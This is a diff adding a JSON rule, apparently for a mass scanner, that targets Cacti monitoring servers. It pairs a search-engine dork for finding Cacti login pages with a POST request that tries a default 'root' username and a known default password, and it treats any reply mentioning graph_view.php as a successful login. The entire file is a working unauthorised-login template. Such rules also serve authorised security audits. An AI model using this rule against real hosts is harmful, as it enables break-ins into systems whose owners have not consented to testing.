@@ -1,0 +1,23 @@
+{
+    "name": "Cacti_DefaultAuth",
+    "method": "POST",
+    "port": [
+        80
+    ],
+    "dork":"title=Login to Cacti",
+    "suffix": [
+        "/index.php",
+        "/cacti/index.php"
+    ],
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "data": {
+        "action": "login",
+        "login_username": "root",
+        "login_password": "www.cnyunwei.com"
+    },
+    "hits": [
+        "graph_view.php"
+    ]
+}
